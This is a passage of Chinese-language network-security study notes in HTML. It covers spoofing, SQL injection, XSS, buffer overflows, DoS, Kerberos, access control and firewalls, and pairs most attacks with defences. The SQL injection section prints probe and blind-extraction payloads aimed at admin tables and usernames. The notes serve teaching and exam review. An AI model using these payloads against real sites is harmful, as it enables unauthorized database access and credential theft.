id="15-Linux常用命令（chmod-ls-ps-passwd-su-sudo等）-熟记"><a href="#15-Linux常用命令（chmod-ls-ps-passwd-su-sudo等）-熟记" class="headerlink" title="15.Linux常用命令（chmod,ls,ps,passwd,su,sudo等）(熟记)"></a>15.Linux常用命令（chmod,ls,ps,passwd,su,sudo等）(熟记)</h2><p>chmod：<br>使用权限 : 所有使用者<br>使用方式 : chmod [-cfvR] [–help] [–version] mode file…<br>说明 : Linux/Unix 的档案调用权限分为三级 : 档案拥有者、群组、其他。利用 chmod 可以藉以控制档案如何被他人所调用。<br>ls:<br>功能： 列出非目录的文件项，然后是每一个目录中的“可显示”文件（可理解为ls命令将本目录向下展开两级）<br>ls用法：ls  [参数]  [目录名]（如过要显示当前目录的文件可不加目录名）<br>ps:<br>使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵尸、哪些进程占用了过多的资源等<br>passwd:<br>用来更改使用者的密码<br>su:<br>用于变更为其他使用者的身份，除 root 外，需要键入该使用者的密码。<br>使用权限：所有使用者。<br>sudo:<br>以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行。<br>使用权限：在 /etc/sudoers 中有出现的使用者。</p><h2 id="16-口令破解与防御"><a href="#16-口令破解与防御" class="headerlink" title="16.口令破解与防御"></a>16.口令破解与防御</h2><h3 id="口令破解"><a href="#口令破解" class="headerlink" title="口令破解"></a>口令破解</h3><p>Win：<br>利用漏洞获取管理员权限，利用Pwdump等工具获取NT在注册表中存储的SAM口令散列，口令破解；<br>Linux：<br>获取root用户权限，获取shadow口令散列，口令破解；</p><h3 id="口令破解防御"><a href="#口令破解防御" class="headerlink" title="口令破解防御"></a>口令破解防御</h3><p>1.强口令<br>2.口令策略<br>3.防御口令泄露、删除和修改</p><h1 id="欺骗技术与防御"><a href="#欺骗技术与防御" class="headerlink" title="欺骗技术与防御"></a>欺骗技术与防御</h1><h2 id="17-IP欺骗"><a href="#17-IP欺骗" class="headerlink" title="17.IP欺骗*"></a>17.IP欺骗*</h2><p>伪造某台主机IP地址的技术(被伪装的主机往往具有某种特权或者被另外的主机所信任)</p><h3 id="简单的IP欺骗"><a href="#简单的IP欺骗" class="headerlink" title="简单的IP欺骗"></a>简单的IP欺骗</h3><p>1.伪装主机从而进行泛洪攻击以达到拒绝服务的目的；<br>2.监听被伪装者与受害者之间的返回数据流<br>TCP协议：主机间无法完成正常3握手，即无法进行数据传输<br>UDP协议：面向无连接的协议，攻击者发送的数据包可以被发送给目标主机；导致拒绝服务；</p><h3 id="源路由攻击"><a href="#源路由攻击" class="headerlink" title="源路由攻击"></a>源路由攻击</h3><p>攻击者在IP欺骗数据包中的源路由字段填入攻击者的IP地址，则返回的数据包就必须经过攻击者；</p><h3 id="TCP会话劫持"><a href="#TCP会话劫持" class="headerlink" title="TCP会话劫持"></a>TCP会话劫持</h3><p>接管现存动态会话的过程，攻击者冒充一方用户，同时监听并掌握会话内容；</p><h4 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h4><p>1.发现攻击目标(必须能检测到目标主机的通信流)<br>2.确认会话状态<br>3.猜测序列号<br>4.使客户主机下线(DoS攻击)<br>5.接管会话，在服务器上创建后门</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><h4 id="1-放弃以地址为基础的验证"><a href="#1-放弃以地址为基础的验证" class="headerlink" title="1.放弃以地址为基础的验证"></a>1.放弃以地址为基础的验证</h4><h4 id="2-进行包过滤"><a href="#2-进行包过滤" class="headerlink" title="2.进行包过滤"></a>2.进行包过滤</h4><p><strong>入口过滤</strong>：不允许任何从外网进入内网的数据包使用内网的IP地址作为源地址<br><strong>出口地址</strong>：来自内网的地址使用了不属于内网的源地址，内网用户发起的欺骗攻击</p><h4 id="3-加密"><a href="#3-加密" class="headerlink" title="3.加密"></a>3.加密</h4><p>通信时要求加密传输和验证</p><h4 id="4-使用随机的初始序列号"><a href="#4-使用随机的初始序列号" class="headerlink" title="4.使用随机的初始序列号"></a>4.使用随机的初始序列号</h4><h4 id="5-禁用路由器的源路由"><a href="#5-禁用路由器的源路由" class="headerlink" title="5.禁用路由器的源路由"></a>5.禁用路由器的源路由</h4><h2 id="18-ARP欺骗-掌握"><a href="#18-ARP欺骗-掌握" class="headerlink" title="18.ARP欺骗*(掌握)"></a>18.ARP欺骗*(掌握)</h2><p>攻击者处于局域网内部，基于ARP协议的缺陷发送虚假的ARP请求或响应，就是ARP欺骗；(Windows arp -a)</p><h3 id="ARP缺陷"><a href="#ARP缺陷" class="headerlink" title="ARP缺陷"></a>ARP缺陷</h3><p>1.不验证自己是否发过对应的ARP请求<br>2.不验证该回应包是否可信<br>3.直接用应答包替换ARP缓存表中的原有信息<br>(主机和网关维护一张IP-MAC地址映射表，攻击者可向目标主机发送虚假的ARP回应包(将MAC地址设为自己的MAC地址)，成为”中间人”,使所有的数据包都会流经攻击者的网卡)</p><h3 id="ARP欺骗检测"><a href="#ARP欺骗检测" class="headerlink" title="ARP欺骗检测"></a>ARP欺骗检测</h3><p>网络频繁掉线、变卡、arp -a查看映射表发现网关MAC地址与真实不符、使用嗅探工具发现网络中有大量的ARP响应包(Ettercap)…</p><h3 id="ARP欺骗防御"><a href="#ARP欺骗防御" class="headerlink" title="ARP欺骗防御"></a>ARP欺骗防御</h3><p>1.<strong>静态绑定</strong><br>a.MAC地址绑定<br>b.使用静态ARP缓存<br>2.<strong>ARP防火墙</strong><br>3.使用ARP服务器(确保服务器不被欺骗)<br>4.及时隔离被欺骗的主机</p><h2 id="19-DNS欺骗-掌握"><a href="#19-DNS欺骗-掌握" class="headerlink" title="19.DNS欺骗(掌握)"></a>19.DNS欺骗(掌握)</h2><p>又称DNS域名重定向或域名劫持，是通过拦截域名解析请求或篡改域名服务器上的数据，使得用户在访问相关域名时返回虚假IP地址或使用户的请求失败的攻击方式。</p><h3 id="DNS欺骗一般过程"><a href="#DNS欺骗一般过程" class="headerlink" title="DNS欺骗一般过程"></a>DNS欺骗一般过程</h3><p>(如果能获得DNS服务器的控制权再好不过，直接伪造一条记录就好，但是很难。尝试控制DNS服务器所在网络下的一台主机，监听网络通信，利用ARP、IP欺骗取得信任后，攻击者嗅探目标主机发送的DNS请求数据包，分析ID和端口号，构造DNS应答包，若发送的应答包ID和端口正确，则把返回的数据包中的域名和IP地址存进DNS缓存表，真实的DNS应答包被丢弃)</p><h3 id="DNS欺骗防御"><a href="#DNS欺骗防御" class="headerlink" title="DNS欺骗防御"></a>DNS欺骗防御</h3><p>1.DNS服务器软件安装补丁<br>2.限制DNS动态更新<br>3.限制区域传送<br>4.关闭DNS服务器的递归查询</p><h2 id="20-电子邮件欺骗与邮件安全（PGP）"><a href="#20-电子邮件欺骗与邮件安全（PGP）" class="headerlink" title="20.电子邮件欺骗与邮件安全（PGP）"></a>20.电子邮件欺骗与邮件安全（PGP）</h2><h3 id="攻击主要表现"><a href="#攻击主要表现" class="headerlink" title="攻击主要表现"></a>攻击主要表现</h3><p>1.电子邮件炸弹、”滚雪球”、垃圾邮件<br>2.自称管理员，假冒，附件木马</p><h3 id="基本方法"><a href="#基本方法" class="headerlink" title="基本方法"></a>基本方法</h3><p>1.相似的电子邮件地址<br>2.冒充回复地址<br>3.利用附件欺骗<br>4.远程登录到SMTP端口25发送邮件</p><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><p>1.树立风险意识<br>2.对邮件加密签名</p><h1 id="Web攻击与防御"><a href="#Web攻击与防御" class="headerlink" title="Web攻击与防御"></a>Web攻击与防御</h1><h2 id="21-SQL注入原理、分类、攻击过程（程序分析能力）-掌握"><a href="#21-SQL注入原理、分类、攻击过程（程序分析能力）-掌握" class="headerlink" title="21.SQL注入原理、分类、攻击过程（程序分析能力）*(掌握)"></a>21.SQL注入原理、分类、攻击过程（程序分析能力）*(掌握)</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用Web应用对后台数据库查询语句处理存在安全漏洞，攻击者提供构造的数据库查询代码，根据返回结果得到目的数据。<br>受影响系统 ：对输入参数不进行检查和过滤<br>就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="1-普通注入"><a href="#1-普通注入" class="headerlink" title="1.普通注入"></a>1.普通注入</h4><p>根据数据库提示的有价值的信息进行注入</p><h4 id="2-盲注"><a href="#2-盲注" class="headerlink" title="2.盲注"></a>2.盲注</h4><p>有经验的管理员在给出错误提示页面时，不提供详细的错误信息，攻击者要对表中的每个字段逐字猜解</p><h3 id="注入点类型"><a href="#注入点类型" class="headerlink" title="注入点类型"></a>注入点类型</h3><h4 id="1-数字型"><a href="#1-数字型" class="headerlink" title="1.数字型"></a>1.数字型</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">...index.php?id=1</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> 表名 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>；</span><br></pre></td></tr></table></figure><h4 id="2-字符型"><a href="#2-字符型" class="headerlink" title="2.字符型"></a>2.字符型</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">...index.php?name=admin</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> 表名 <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'admin'</span>;</span><br></pre></td></tr></table></figure><h3 id="SQLi方法"><a href="#SQLi方法" class="headerlink" title="SQLi方法"></a>SQLi方法</h3><p>判断是否存在注入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=1 <span class="comment">#返回正常页面</span></span><br><span class="line">and 1=2 <span class="comment">#返回错误页面或空页</span></span><br></pre></td></tr></table></figure><p>布尔型注入<br>基于时间延迟注入<br>可联合查询注入<br>多语句查询注入</p><h3 id="SQLi过程"><a href="#SQLi过程" class="headerlink" title="SQLi过程"></a>SQLi过程</h3><p><strong>客户端(参数值等数据被修改)–&gt;服务端(未经检查和过滤，将被修改的数据注入到SQL语句中，SQL语句功能被修改)–&gt;数据库引擎(执行被修改后的SQL命令)–&gt;服务端(将注入的结果返回客户端)–&gt;客户端(根据上一次注入获得的敏感信息，构造注入语句进一步注入)</strong><br>1.寻找注入点(存在SQLi漏洞的连接)<br>2.测试该网站是否存在SQLi漏洞<br>3.猜解数据库名-&gt;表名-&gt;字段名-&gt;表的内容<br>(*重点查询与用户相关的表，获取用户名+密码(管理员优先))<br>4.后续攻击</p><h3 id="注入实例"><a href="#注入实例" class="headerlink" title="注入实例"></a>注入实例</h3><p>1.形如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">...index.php?id=1</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> 表名 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>；</span><br></pre></td></tr></table></figure><p>2.测试有无漏洞<br>?id=1’  报错，若有返回信息，可能可以确定后台数据库版本型号<br>在末尾加and 1=1 \and 1=2<br>3.猜解表名<br>末尾加and exists(select * from admin)<br>若返回正常页面，则存在admin表<br>4.猜解字段名<br>在末尾加and exists(select username from admin)<br>若返回正常页面，则存在username字段<br>在末尾加and exists(select password from admin)<br>若返回正常页面，则存在password字段<br>5.猜解用户名(折半查找)<br>and 1=(select id from (select * from admin where id=1)where asc(mid(username,1,1))&lt;100)</p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>SQLmap等</p><h3 id="SQLi防御"><a href="#SQLi防御" class="headerlink" title="SQLi防御"></a>SQLi防御</h3><p><strong>(需要掌握简单的代码修改方式以抵御SQLi攻击)</strong><br>1.使用预编译语句，绑定变量<br>2.对用户提交的数据和参数进行严格的过滤(,’’;等)<br>3.摒弃动态SQL语句，改用存储过程来访问和操作数据<br>4.使用安全函数<br>5最小权限原则，区分普通用户与管理员权限<br>避免Web应用直接使用root等高权限用户直接连接DB</p><h2 id="22-XSS原理、分类、攻击过程（程序分析能力）-掌握"><a href="#22-XSS原理、分类、攻击过程（程序分析能力）-掌握" class="headerlink" title="22.XSS原理、分类、攻击过程（程序分析能力）*(掌握)"></a>22.XSS原理、分类、攻击过程（程序分析能力）*(掌握)</h2><p>通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法<strong>注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序</strong>。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p><h3 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h3><p>Web服务器没有对用户输入进行有效验证或验证强度不够，而又轻易将他们返回给客户端；<br>一般需要：<br>1.存在跨站脚本漏洞的Web应用<br>2.用户点击或浏览某个页面</p><h3 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h3><h4 id="1-反射型"><a href="#1-反射型" class="headerlink" title="1.反射型"></a>1.反射型</h4><p>也叫非持久型XSS，是指发生请求时，XSS代码出现在请求URL中，作为参数提交到服务器，服务器解析并响应。响应结果中包含XSS代码，最后浏览器解析并执行。从概念上可以看出，反射型XSS代码是首先出现在URL中的，然后需要服务端解析，最后需要浏览器解析之后XSS代码才能够攻击。<br>（简单地将用户输入数据返回给浏览器，黑客需要诱导用户点击一个恶意链接）</p><h4 id="2-存储式"><a href="#2-存储式" class="headerlink" title="2.存储式"></a>2.存储式</h4><p>永久存储在服务器数据库或者文件中</p><h4 id="3-DOM型"><a href="#3-DOM型" class="headerlink" title="3.DOM型"></a>3.DOM型</h4><p>与前两种区别：不需要服务器解析响应，而是浏览器的DOM解析器触发</p><h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p>参考： <a href="https://www.cnblogs.com/mao2080/p/9460397.html" target="_blank" rel="noopener">https://www.cnblogs.com/mao2080/p/9460397.html</a></p><h3 id="xss防御"><a href="#xss防御" class="headerlink" title="xss防御"></a>xss防御</h3><p><strong>(需要掌握简单的代码修改方式以抵御XSS攻击)</strong><br>1.输入参数字符过滤<br>2.输出参数进行转码<br>3.限制输入参数长度<br>4.设置cookie httponly为true</p><p>1） 方法一：<br>给Cookie添加HttpOnly属性, 这种属性设置后, 只能在http请求中传递, 在脚本中, document.cookie无法获取到该Cookie值. 对XSS的攻击, 有一定的防御值. 但是对网络拦截, 还是泄露了.<br>2）方法二：<br>在cookie中添加校验信息, 这个校验信息和当前用户外置环境有些关系,比如ip,user agent等有关. 这样当cookie被人劫持了, 并冒用, 但是在服务器端校验的时候, 发现校验值发生了变化, 因此要求重新登录, 这样也是种很好的思路, 去规避cookie劫持.<br>3）方法三：<br>cookie中session id的定时更换, 让session id按一定频率变换, 同时对用户而言, 该操作是透明的, 这样保证了服务体验的一致性.<br>（ 可参考：<a href="https://www.cnblogs.com/momjs/p/10346579.html" target="_blank" rel="noopener">https://www.cnblogs.com/momjs/p/10346579.html</a> ）</p><h2 id="23-其他Web攻击类型"><a href="#23-其他Web攻击类型" class="headerlink" title="23.其他Web攻击类型*"></a>23.其他Web攻击类型*</h2><p>CSRF攻击：<br><a href="https://www.cnblogs.com/collin/articles/9637999.html" target="_blank" rel="noopener">https://www.cnblogs.com/collin/articles/9637999.html</a><br>文件上传漏洞：<br>指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p><p>命令执行漏洞：<br><a href="https://www.cnblogs.com/bmjoker/p/9084864.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9084864.html</a><br>xxe漏洞 ：<br><a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/177979.html</a></p><h2 id="24-Web攻击的防御"><a href="#24-Web攻击的防御" class="headerlink" title="24.Web攻击的防御*"></a>24.Web攻击的防御*</h2><h1 id="缓冲区溢出攻击与防御-掌握"><a href="#缓冲区溢出攻击与防御-掌握" class="headerlink" title="缓冲区溢出攻击与防御(掌握)"></a>缓冲区溢出攻击与防御(掌握)</h1><h2 id="25-缓冲区溢出原理-代码分析能力"><a href="#25-缓冲区溢出原理-代码分析能力" class="headerlink" title="25.缓冲区溢出原理(代码分析能力)"></a>25.缓冲区溢出原理(代码分析能力)</h2><p>缓冲区：计算机在内存中开辟的一段连续的内存块，用于存放相同类型的数据</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>向固定长度的缓冲区中写入超出其预定长度的内容，导致缓冲区数据溢出，从而覆盖其周围的内存空间<br><strong>黑客借此精心构造填充数据，导致原有的流程改变，转去执行特殊代码，从而获得控制权</strong></p><h3 id="缓冲区溢出攻击过程"><a href="#缓冲区溢出攻击过程" class="headerlink" title="缓冲区溢出攻击过程"></a>缓冲区溢出攻击过程</h3><p><strong>(要求能根据代码分析溢出原理)</strong><br>1.在程序的地址空间中安排适当的代码<br>2.通过适当的初始化寄存器和存储器，让程序跳转到安排好的地址空间执行</p><h2 id="26-栈溢出（程序分析能力）"><a href="#26-栈溢出（程序分析能力）" class="headerlink" title="26.栈溢出（程序分析能力）*"></a>26.栈溢出（程序分析能力）*</h2><h2 id="27-其他溢出的工作原理"><a href="#27-其他溢出的工作原理" class="headerlink" title="27.其他溢出的工作原理"></a>27.其他溢出的工作原理</h2><p>格式化字符串溢出<br>整数溢出<br>堆溢出</p><h2 id="28-缓冲区溢出的防御措施"><a href="#28-缓冲区溢出的防御措施" class="headerlink" title="28.缓冲区溢出的防御措施"></a>28.缓冲区溢出的防御措施</h2><p><strong>(对简单代码能够修改优化，使之免受溢出攻击)</strong></p><h3 id="系统管理上"><a href="#系统管理上" class="headerlink" title="系统管理上"></a>系统管理上</h3><p>1.关闭不需要的特权程序(缓冲区溢出只有获取更高权限时才有意义)<br>2.及时给程序漏洞打补丁</p><h3 id="软件开发过程中"><a href="#软件开发过程中" class="headerlink" title="软件开发过程中"></a>软件开发过程中</h3><p>1.编写正确的代码(对数据长度和有效性检查，确保目标缓冲区中数据不越界并有效)<br>C/C++语言本身不进行强类型和长度检查<br>2.缓冲区不可执行<br>3.改进C语言函数库<br>隐患函数替换:如strncpy()替换strcpy()、strncat()替换strcat(),该类函数限定了字符串长度<br>4.数组边界检查(使超长代码不可能被植入)<br>5.程序指针完整性检查(阻止由于函数返回地址或函数指针的改变而导致程序执行流程的改变；检测指针是否被恶意改动，若改动则拒绝执行)</p><h1 id="拒绝服务攻击-DoS攻击-掌握"><a href="#拒绝服务攻击-DoS攻击-掌握" class="headerlink" title="拒绝服务攻击(DoS攻击)(掌握)"></a>拒绝服务攻击(DoS攻击)(掌握)</h1><h2 id="29-拒绝服务攻击的概念、分类"><a href="#29-拒绝服务攻击的概念、分类" class="headerlink" title="29.拒绝服务攻击的概念、分类"></a>29.拒绝服务攻击的概念、分类</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>破坏型攻击，不以获取目标系统访问权限为目的；<br>利用传输协议弱点、系统漏洞、服务漏洞对目标系统发起大规模进攻，用超出目标处理能力的海量数据包消耗可用系统资源、带宽资源等，或造成程序缓冲区溢出错误，致使其无法处理合法用户请求，无法提供正常服务，最终导致网络服务瘫痪，甚至系统死机。</p><h3 id="分类-2"><a href="#分类-2" class="headerlink" title="分类"></a>分类</h3><p>1.资源消耗<br>2.系统或应用程序缺陷<br>(Ping致死、land攻击、Smurf攻击、IP分片攻击、UDP泛洪攻击等)<br>3.配置修改<br>(修改运行配置，导致网络系统不能正常提供服务)</p><h2 id="30-拒绝服务攻击的实例"><a href="#30-拒绝服务攻击的实例" class="headerlink" title="30.拒绝服务攻击的实例"></a>30.拒绝服务攻击的实例</h2><h2 id="31-DDoS的工作原理"><a href="#31-DDoS的工作原理" class="headerlink" title="31.DDoS的工作原理"></a>31.DDoS的工作原理</h2><p>即分布式拒绝服务攻击：<br><a href="https://baijiahao.baidu.com/s?id=1612405556732723729&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">https://baijiahao.baidu.com/s?id=1612405556732723729&amp;wfr=spider&amp;for=pc</a></p><h2 id="32-拒绝服务攻击的防御"><a href="#32-拒绝服务攻击的防御" class="headerlink" title="32.拒绝服务攻击的防御"></a>32.拒绝服务攻击的防御</h2><p>1.进行合理带宽限制<br>限制基于协议的带宽；如端口25只能使用25%的带宽<br>2.运行尽可能少的服务，只允许必要的通信<br>3.及时安装系统补丁<br>4.封锁恶意IP地址<br>5.增强系统用户的安全意识，避免成为傀儡主机</p><h2 id="6-建立健全的DoS-DDoS攻击的应急响应机制"><a href="#6-建立健全的DoS-DDoS攻击的应急响应机制" class="headerlink" title="6.建立健全的DoS/DDoS攻击的应急响应机制"></a>6.建立健全的DoS/DDoS攻击的应急响应机制</h2><h1 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h1><h2 id="33-AAA"><a href="#33-AAA" class="headerlink" title="33.AAA"></a>33.AAA</h2><p>1.认证(你是谁？)<br>2.授权(允许你干什么？)<br>3.审计/记账(你干了什么？)</p><h2 id="34-常用身份认证技术"><a href="#34-常用身份认证技术" class="headerlink" title="34.常用身份认证技术"></a>34.常用身份认证技术</h2><h3 id="基于口令的认证"><a href="#基于口令的认证" class="headerlink" title="基于口令的认证"></a>基于口令的认证</h3><h4 id="1-基于单项哈希函数-结合挑战-响应机制"><a href="#1-基于单项哈希函数-结合挑战-响应机制" class="headerlink" title="1.基于单项哈希函数(结合挑战-响应机制)"></a>1.基于单项哈希函数(结合挑战-响应机制)</h4><p><img src="https://s2.ax1x.com/2019/12/10/QB7IZn.jpg" alt="QB7IZn.jpg"><br><img src="https://s2.ax1x.com/2019/12/10/QB7hrj.jpg" alt="QB7hrj.jpg"></p><h4 id="2-加盐口令"><a href="#2-加盐口令" class="headerlink" title="2.加盐口令"></a>2.加盐口令</h4><h4 id="3-SKEY机制"><a href="#3-SKEY机制" class="headerlink" title="3.SKEY机制"></a>3.SKEY机制</h4><h4 id="4-Bellovin-Merritt的EKE协议"><a href="#4-Bellovin-Merritt的EKE协议" class="headerlink" title="4.Bellovin-Merritt的EKE协议"></a>4.Bellovin-Merritt的EKE协议</h4><h3 id="基于密码学的认证"><a href="#基于密码学的认证" class="headerlink" title="基于密码学的认证"></a>基于密码学的认证</h3><h3 id="基于生物特征的认证"><a href="#基于生物特征的认证" class="headerlink" title="基于生物特征的认证"></a>基于生物特征的认证</h3><h2 id="35-Kerberos协议-掌握"><a href="#35-Kerberos协议-掌握" class="headerlink" title="35.Kerberos协议(掌握)"></a>35.Kerberos协议(掌握)</h2><p>Kerberos是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。</p><h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><p>1.<strong>认证服务器AS</strong><br>2.<strong>票据许可服务器TGS</strong><br>3.客户端Client<br>4.应用服务器Server</p><h3 id="凭证"><a href="#凭证" class="headerlink" title="凭证"></a>凭证</h3><p>1.<strong>票据Ticket</strong><br>2.<strong>鉴别码Authenticator</strong></p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><table><thead><tr><th align="center">记号</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">C</td><td align="center">客户端</td></tr><tr><td align="center">S</td><td align="center">服务端</td></tr><tr><td align="center">ADc</td><td align="center">客户的网络地址</td></tr><tr><td align="center">Lifetime</td><td align="center">票据的生存期</td></tr><tr><td align="center">TS</td><td align="center">时间戳</td></tr><tr><td align="center">Kx</td><td align="center">x的私有密钥</td></tr><tr><td align="center">Kx,y</td><td align="center">x与y的会话密钥</td></tr><tr><td align="center">Kx[m]</td><td align="center">以x的私有密钥加密的m</td></tr><tr><td align="center">Ticketx</td><td align="center">x的票据</td></tr><tr><td align="center">Authenticatorx</td><td align="center">x的鉴别码</td></tr></tbody></table><p>1.C请求票据许可票据<br>2.AS发放票据许可票据和会话密钥<br>3.C请求服务器票据<br>4.TGS发放服务器票据和会话密钥<br>5.C请求服务<br>6.S提供服务器认证信息<br><img src="https://s2.ax1x.com/2019/12/10/QB74qs.jpg" alt="QB74qs.jpg"></p><h2 id="36-PKI原理"><a href="#36-PKI原理" class="headerlink" title="36.PKI原理"></a>36.PKI原理</h2><p>(公钥基础设施PKI:是一个包括硬件、软件、人员、策略和规程的集合，用来实现基于公钥密码体制的密钥和证书的产生、管理、存储、分发和撤销等功能。<br>PKI体系是计算机软硬件、权威机构及应用系统的结合。它为实施电子商务、电子政务、办公自动化等提供了基本的安全服务，从而使那些彼此不认识或距离很远的用户能通过信任链安全地交流。)<br><em>它利用公共密钥算法的特点，建立一套证书发放、管理和使用的体系，来支持和完成网络系统中的身份认证、信息加密、保证数据完整性和抗抵赖性。PKI 体系可以有多种不同的体系结构、实现方法和通信协议。</em></p><h2 id="37-挑战相应机制"><a href="#37-挑战相应机制" class="headerlink" title="37.挑战相应机制**"></a>37.挑战相应机制**</h2><p>顾名思义，基于挑战/应答（Challenge/Response）方式的身份认证系统就是每次认证时认证服务器端都给客户端发送一个不同的”挑战”字串，客户端程序收到这个”挑战”字串后，做出相应的”应答”,以此机制而研制的系统.<br><strong>认证过程</strong>：<br>1) 客户向认证服务器发出请求，要求进行身份认证；<br>2) 认证服务器从用户数据库中查询用户是否是合法的用户，若不是，则不做进一步处理；<br>3) 认证服务器内部产生一个随机数，作为”提问”，发送给客户；<br>4) 客户将用户名字和随机数合并，使用单向Hash函数（例如MD5算法）生成一个字节串作为应答；<br>5) 认证服务器将应答串与自己的计算结果比较，若二者相同，则通过一次认证；否则，认证失败；<br>6) 认证服务器通知客户认证成功或失败。<br>以后的认证由客户不定时地发起，过程中没有了客户认证请求一步。两次认证的时间间的密钥隔不能太短，否则就给网络、客户和认证服务器带来太大的开销；也不能太长，否则不能保证用户不被他人盗用IP地址，一般定为1-2分钟。</p><h1 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h1><h2 id="38-访问控制的概念"><a href="#38-访问控制的概念" class="headerlink" title="38.访问控制的概念"></a>38.访问控制的概念</h2><p>就是在身份认证的基础上，依据授权对对提出的资源访问请求加以控制；<br>遵循原则：<br>1.最小特权原则<br>2.多人负责原则(即授权分散化)<br>3.职责分离原则</p><h2 id="39-常见的访问控制的模型"><a href="#39-常见的访问控制的模型" class="headerlink" title="39.常见的访问控制的模型"></a>39.常见的访问控制的模型</h2><p>1.自主访问控制DAC<br>2.强制访问控制MAC<br>3.基于角色的访问控制RBAC<br>4.基于属性的访问控制ABAC</p><h2 id="40-访问控制机制"><a href="#40-访问控制机制" class="headerlink" title="40.访问控制机制"></a>40.访问控制机制</h2><p>指对主体访问客体的权力或能力的限制，以及限制进入物理区域(出入控制)和限制使用计算机系统和计算机存取数据的过程(存取控制)。</p><h2 id="41-计算机安全形式化模型"><a href="#41-计算机安全形式化模型" class="headerlink" title="41.计算机安全形式化模型"></a>41.计算机安全形式化模型</h2><p>验证安全设计与实现；</p><h3 id="1-Bell-LaPadula模型"><a href="#1-Bell-LaPadula模型" class="headerlink" title="1.Bell-LaPadula模型"></a>1.Bell-LaPadula模型</h3><h3 id="2-Biba模型"><a href="#2-Biba模型" class="headerlink" title="2.Biba模型"></a>2.Biba模型</h3><h1 id="防火墙与入侵检测"><a href="#防火墙与入侵检测" class="headerlink" title="防火墙与入侵检测"></a>防火墙与入侵检测</h1><h2 id="42-防火墙的基本原理"><a href="#42-防火墙的基本原理" class="headerlink" title="42.防火墙的基本原理"></a>42.防火墙的基本原理</h2><p>防火墙技术是通过有机结合各类用于安全管理与筛选的软件和硬件设备，帮助计算机网络于其内、外网之间构建一道相对隔绝的保护屏障，以保护用户资料与信息安全性的一种技术。<br>防火墙技术的功能主要在于及时发现并处理计算机网络运行时可能存在的安全风险、数据传输等问题，其中处理措施包括隔离与保护，同时可对计算机网络安全当中的各项操作实施记录与检测，以确保计算机网络运行的安全性，保障用户资料与信息的完整性，为用户提供更好、更安全的计算机网络使用体验。</p><p>1.限制人们从一个特别的控制点进入，从而防止入侵者接近内部设施；<br>2.限定人们从一个特别的点离开，从而有效的保护内部资源；</p><h2 id="43-防火墙技术分类"><a href="#43-防火墙技术分类" class="headerlink" title="43.防火墙技术分类"></a>43.防火墙技术分类</h2><h3 id="1-包过滤防火墙-路由器"><a href="#1-包过滤防火墙-路由器" class="headerlink" title="1.包过滤防火墙/路由器"></a>1.包过滤防火墙/路由器</h3><p>（静态/动态）工作在网络层/传输层；</p><h3 id="2-代理技术"><a href="#2-代理技术" class="headerlink" title="2.代理技术"></a>2.代理技术</h3><p>(应用层/电路级)</p><h3 id="3-混合型"><a href="#3-混合型" class="headerlink" title="3.混合型"></a>3.混合型</h3><h2 id="44-防火墙的配置方案"><a href="#44-防火墙的配置方案" class="headerlink" title="44.防火墙的配置方案"></a>44.防火墙的配置方案</h2><h3 id="1-屏蔽路由器"><a href="#1-屏蔽路由器" class="headerlink" title="1.屏蔽路由器"></a>1.屏蔽路由器</h3><h3 id="2-双宿主机"><a 